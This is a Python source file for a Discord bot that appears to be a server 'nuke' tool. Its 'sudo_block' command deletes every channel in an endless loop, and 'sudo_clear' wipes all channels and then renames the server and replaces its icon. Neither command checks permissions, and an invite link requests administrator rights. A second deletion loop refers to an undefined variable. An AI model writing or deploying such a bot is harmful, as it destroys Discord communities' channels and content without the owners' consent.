import discord
import random
from random import randint
from discord.ext import commands
from discord import Permissions
import os
TOKEN = "your_token"
client = commands.Bot(command_prefix="g!", help_command=None)
invite = "https://discord.com/api/oauth2/authorize?client_id=940130945003036713&permissions=8&scope=bot"



@client.event
async def on_ready():
    print("{0.user} has logged in successfully".format(client))
    print("===================================")



@client.command()
async def sudo_block(ctx):
    await ctx.message.delete()
    
    while True:
        for c in ctx.guild.channels: 
            await c.delete()
    
    for channel in guild.channels:
      try:
        await channel.delete()
        print(f"{channel.name} was deleted.")
      except:
        print( f"{channel.name} was NOT deleted." )


        

@client.command()
async def sudo_clear(ctx):
    await ctx.message.delete()
    for c in ctx.guild.channels:
        await c.delete()
    await ctx.guild.create_text_channel('text_channel')
    await ctx.guild.create_text_channel('text_channel')
    await ctx.guild.create_text_channel('text_channel')
    with open('/Users/MatthewHa/code-ha/python/discord.png', 'rb') as f:
        icon = f.read()
    await ctx.guild.edit(name="Name")
    await ctx.guild.edit(icon=icon)
    print("Successfully!")

@client.command()
async def logout(ctx):
    if ctx.message.author.id == 786937653311569940:
        await ctx.message.delete()
        await ctx.bot.close()
        print (f"{client.user.name} has logged out successfully.")


@client.command(pass_context=True)
async def purge(ctx, limit: int):
        await ctx.channel.purge(limit=limit)
        await ctx.message.delete()
        print("Cleared successfully")

@client.command()
async def invite(ctx):
    await ctx.send(f'|| https://discord.com/api/oauth2/authorize?client_id=940130945003036713&permissions=8&scope=bot ||')




client.run(TOKEN, bot=True)




